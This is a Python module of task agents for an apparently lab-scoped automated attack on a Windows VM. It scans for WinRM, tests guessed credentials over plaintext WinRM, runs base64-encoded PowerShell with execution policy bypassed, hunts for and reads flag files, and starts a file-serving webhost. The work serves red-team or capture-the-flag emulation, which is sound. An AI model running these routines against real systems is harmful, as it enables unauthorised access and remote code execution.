"""Task agents for the WinRM/Windows target (APT32-A).

Credentials and PowerShell payloads are shipped to the guest base64-encoded so
arbitrary guessed passwords and Windows paths (``C:\\Users`` — the ``\\U`` that a
prior hand-escaped version fed straight into Python's ``\\UXXXXXXXX`` unicode
escape) can't break the generated Python string literal.
"""

from __future__ import annotations

import base64
from functools import partial

from ..flags import find_flag as extract_flag
from ..net import parse_nmap
from . import TaskContext

_WINRM_PORTS = "22,445,3389,5985,5986"


def _b64(s: str) -> str:
    return base64.b64encode(s.encode()).decode("ascii")


def _winrm_python(target_ip: str, user_b64: str, pass_b64: str, inner_cmd: str) -> str:
    """Build the python3 one-liner that drives pywinrm against *target_ip*."""
    return (
        f'python3 -c "'
        f"import base64; from winrm.protocol import Protocol; "
        f"u = base64.b64decode('{user_b64}').decode(); "
        f"pw = base64.b64decode('{pass_b64}').decode(); "
        f"p = Protocol(endpoint='http://{target_ip}:5985/wsman', transport='plaintext', username=u, password=pw); "
        f"s = p.open_shell(); c = p.run_command(s, {inner_cmd}); "
        f"o, e, co = p.get_command_output(s, c); print(o.decode()); p.close_shell(s)"
        f'"'
    )


def _authed_target(ctx: TaskContext) -> str | None:
    for ip, authed in ctx.state.winrm_sessions.items():
        if authed:
            return ip
    return None


def install_toolkit(ctx: TaskContext, task: dict) -> dict:
    if ctx.state.toolkit_installed:
        return {"success": True, "output": "Toolkit already installed."}
    run = partial(ctx.vbox.guest_bash, ctx.attacker_vm)
    ctx.log.info("Installing offensive toolkit (nmap, curl, netcat, pywinrm)...")
    run(
        "sudo apt-get update -qq && sudo apt-get install -y -qq "
        "nmap curl netcat-openbsd python3-pip && pip3 install pywinrm -q 2>&1",
        timeout=ctx.config.toolkit_timeout,
    )
    check_nmap = run("command -v nmap && echo OK || echo MISSING")
    check_winrm = run("python3 -c 'from winrm.protocol import Protocol; print(\"OK\")' 2>&1")
    if "OK" in check_nmap and "OK" in check_winrm:
        ctx.state.toolkit_installed = True
        return {"success": True, "output": "Toolkit installed: nmap, curl, netcat, pywinrm"}
    return {"success": False, "output": "Toolkit installation failed. Check network connectivity."}


def scan_network(ctx: TaskContext, task: dict) -> dict:
    if not ctx.state.toolkit_installed:
        return {"success": False, "output": "nmap not installed. Run 'install_toolkit' first."}
    subnet = ctx.state.current_subnet
    # -Pn: probe ports directly. Windows Firewall drops ICMP by default, so
    # without it the real target (port 5985 open) is marked down and skipped.
    out = ctx.vbox.guest_bash(
        ctx.attacker_vm,
        f"nmap -T4 -Pn -p {_WINRM_PORTS} --exclude {ctx.scope.nmap_exclude_arg()} --open {subnet} 2>&1",
        timeout=ctx.config.scan_timeout,
    )
    if "command not found" in out.lower():
        return {"success": False, "output": f"nmap not found. Install toolkit first.\n{out[:200]}"}

    before = len(ctx.state.discovered_hosts)
    for ip, info in parse_nmap(out, ctx.scope).items():
        existing = ctx.state.discovered_hosts.setdefault(ip, {"open_ports": [], "os": "unknown"})
        for port in info["open_ports"]:
            if port not in existing["open_ports"]:
                existing["open_ports"].append(port)
        if info["os"] != "unknown":
            existing["os"] = info["os"]
    found = len(ctx.state.discovered_hosts) - before

    if found == 0 and subnet == "192.168.56.0/24":
        ctx.state.current_subnet = "192.168.57.0/24"
        return {"success": True, "output": f"No new hosts on {subnet}. Auto-switching to 192.168.57.0/24.\n{out[:400]}"}
    if found == 0:
        return {"success": True, "output": f"No hosts found on {subnet}.\n{out[:400]}"}

    parts = [f"Found {found} new host(s) on {subnet}:"]
    parts += [f"  {ip}: ports={info.get('open_ports', [])}" for ip, info in ctx.state.discovered_hosts.items()]
    return {"success": True, "output": "\n".join(parts) + f"\n\nRaw output:\n{out[:300]}"}


def test_winrm(ctx: TaskContext, task: dict) -> dict:
    username, password = task.get("username"), task.get("password")
    target_ip = task.get("target_ip")
    if not username or not password:
        return {"success": False, "output": "Must supply 'username' and 'password' fields."}
    if target_ip and not ctx.scope.is_target_allowed(target_ip):
        return {"success": False, "output": f"{target_ip} is out of scope. Refusing."}

    if not target_ip:
        for ip, info in ctx.state.discovered_hosts.items():
            if 5985 in info.get("open_ports", []) and not ctx.state.winrm_sessions.get(ip):
                target_ip = ip
                break
    if not target_ip:
        return {"success": False, "output": "No candidate host. Scan for a host with 5985 open first."}
    if ctx.state.winrm_sessions.get(target_ip):
        return {"success": True, "output": f"Already authenticated to {target_ip}."}

    py = _winrm_python(target_ip, _b64(username), _b64(password), "'echo WINRM_OK'")
    out = ctx.vbox.guest_bash(ctx.attacker_vm, py)
    ok = "WINRM_OK" in out
    ctx.state.tested_credentials.append((target_ip, username, password, ok))
    ctx.audit.event("test_winrm", target=target_ip, username=username, success=ok)
    if ok:
        ctx.state.winrm_sessions[target_ip] = True
        ctx.state.host_credentials[target_ip] = (username, password)
        return {"success": True, "output": f"WinRM authenticated to {target_ip} with {username}:{password}!"}
    return {"success": False, "output": f"WinRM auth failed for {target_ip} {username}:{password}.\n{out[:300]}"}


def execute_powershell(ctx: TaskContext, task: dict) -> dict:
    command = task.get("command", "hostname")
    target_ip = task.get("target_ip") or _authed_target(ctx)
    if target_ip and not ctx.scope.is_target_allowed(target_ip):
        return {"success": False, "output": f"{target_ip} is out of scope. Refusing."}
    if not target_ip or not ctx.state.winrm_sessions.get(target_ip):
        return {"success": False, "output": "No authenticated WinRM session. Test credentials first."}
    username, password = ctx.state.host_credentials.get(target_ip, (None, None))
    if not username:
        return {"success": False, "output": f"No stored credentials for {target_ip}."}

    # -EncodedCommand (UTF-16LE base64) so the payload survives bash + Python
    # string parsing with no quote/backslash escaping.
    encoded = base64.b64encode(command.encode("utf-16-le")).decode("ascii")
    inner = f"'powershell -ExecutionPolicy Bypass -EncodedCommand {encoded}'"
    py = _winrm_python(target_ip, _b64(username), _b64(password), inner)
    out = ctx.vbox.guest_bash(ctx.attacker_vm, py)
    ctx.state.executed_commands.append(command)
    ctx.audit.event("execute_powershell", target=target_ip, command=command)
    return {"success": True, "output": out[:1000]}


def find_flag(ctx: TaskContext, task: dict) -> dict:
    target_ip = _authed_target(ctx)
    if not target_ip:
        return {"success": False, "output": "No WinRM session. Authenticate first."}

    attempts = [
        ("Get-ChildItem -Path C:\\Users\\*\\Desktop -Filter flag* -ErrorAction SilentlyContinue "
         "| Select-Object -ExpandProperty FullName"),
        ("Get-ChildItem -Path C:\\Users -Recurse -Filter flag*.txt -ErrorAction SilentlyContinue "
         "| Select-Object -ExpandProperty FullName -First 3"),
        ('cmd /c "dir C:\\Users\\flag*.txt /s /b 2>nul"'),
    ]
    dumps = []
    for cmd in attempts:
        output = execute_powershell(ctx, {"command": cmd, "target_ip": target_ip}).get("output", "")
        dumps.append(output.strip()[:300])
        for line in output.splitlines():
            if "flag" in line.lower():
                ctx.state.flag_path = line.strip()
                ctx.state.found_files.append(line.strip())
                return {"success": True, "output": f"FLAG FOUND: {line.strip()}\nCall read_flag next."}
    return {"success": True, "output": "Flag not found on common paths.\n" + "\n---\n".join(dumps)}


def read_flag(ctx: TaskContext, task: dict) -> dict:
    target_ip = _authed_target(ctx)
    if not target_ip:
        return {"success": False, "output": "No WinRM session. Authenticate first."}
    flag_path = ctx.state.flag_path or "C:\\Users\\vagrant\\Desktop\\flag.txt"
    output = execute_powershell(
        ctx, {"command": f'Get-Content -LiteralPath "{flag_path}"', "target_ip": target_ip}
    ).get("output", "")
    flag = extract_flag(output)
    if flag:
        ctx.state.flag_found = True
        ctx.state.flag_content = flag
        return {"success": True, "output": f"FLAG CAPTURED: {flag}", "flag_captured": True}
    if "cannot find" in output.lower() or "not found" in output.lower():
        return {"success": True, "output": "No flag.txt at that path. Use find_flag first."}
    return {"success": True, "output": f"Output: {output[:300]}"}


def start_webhost(ctx: TaskContext, task: dict) -> dict:
    if ctx.state.webhost_running:
        return {"success": True, "output": "Webhost already running."}
    port = ctx.state.webhost_port
    ctx.vbox.guest_bash(ctx.attacker_vm, f"nohup python3 -m http.server {port} --directory /tmp > /dev/null 2>&1 &")
    if "LISTEN" in ctx.vbox.guest_bash(ctx.attacker_vm, f"ss -tlnp | grep {port}"):
        ctx.state.webhost_running = True
        return {"success": True, "output": f"Webhost started on port {port}."}
    return {"success": False, "output": "Failed to start webhost."}


def done(ctx: TaskContext, task: dict) -> dict:
    return {"success": True, "output": "Planner signaled completion."}


REGISTRY = {
    "install_toolkit": install_toolkit,
    "scan_network": scan_network,
    "test_winrm": test_winrm,
    "execute_powershell": execute_powershell,
    "find_flag": find_flag,
    "read_flag": read_flag,
    "start_webhost": start_webhost,
    "done": done,
    "finished": done,
    "complete": done,
    "stop": done,
}
